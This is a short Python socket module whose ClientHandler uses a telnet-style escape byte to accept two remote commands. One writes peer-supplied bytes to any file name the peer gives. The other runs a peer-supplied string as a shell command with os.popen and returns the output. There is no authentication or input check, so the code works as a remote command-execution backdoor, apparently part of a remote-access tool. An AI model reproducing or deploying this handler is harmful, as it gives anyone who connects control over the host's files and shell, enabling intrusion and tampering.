import os
import socket
from enum import Enum

IAP: int = 0xff
LENGTH_SIZE: int = 10


class Commands(Enum):
    UPLOAD = 254
    EXEC_ = 253
    SEND = 252
    S_SEND = 251


class ClientHandler:
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self.iap_on = False

    def download_file(self):
        file_name_len = int(self.sock.recv(LENGTH_SIZE).decode())
        file_name = self.sock.recv(file_name_len).decode()

        file_len = int(self.sock.recv(LENGTH_SIZE).decode())

        with open(file_name, "wb") as f:
            while file_len > 0:
                received = self.sock.recv(4096)
                file_len -= len(received)
                f.write(received)

    def retrieve_exec(self):
        command_len = int(self.sock.recv(LENGTH_SIZE).decode())
        command = self.sock.recv(command_len).decode()

        output = os.popen(command).read().encode()
        output_len = str(len(output))
        self.sock.sendall(b' ' * (LENGTH_SIZE - len(output_len)) + output_len.encode())
        self.sock.sendall(output)

    def process_data(self, data: int):
        if self.iap_on:
            if data == IAP:
                print(chr(data), end='')
            if data == Commands.UPLOAD.value:
                self.download_file()
            if data == Commands.EXEC_.value:
                self.retrieve_exec()

            self.iap_on = False
        elif data == IAP:
            self.iap_on = True
        else:
            print(chr(data), end='')

    def handler(self):
        try:
            print(f"-> {self.sock.getpeername()[0]} connected on port {self.sock.getpeername()[1]}")

            while True:
                data = self.sock.recv(1)
                if not data:
                    print(f"-> {self.sock.getpeername()[0]}:{self.sock.getpeername()[1]} disconnected")
                    break

                self.process_data(data[0])
        finally:
            self.sock.close()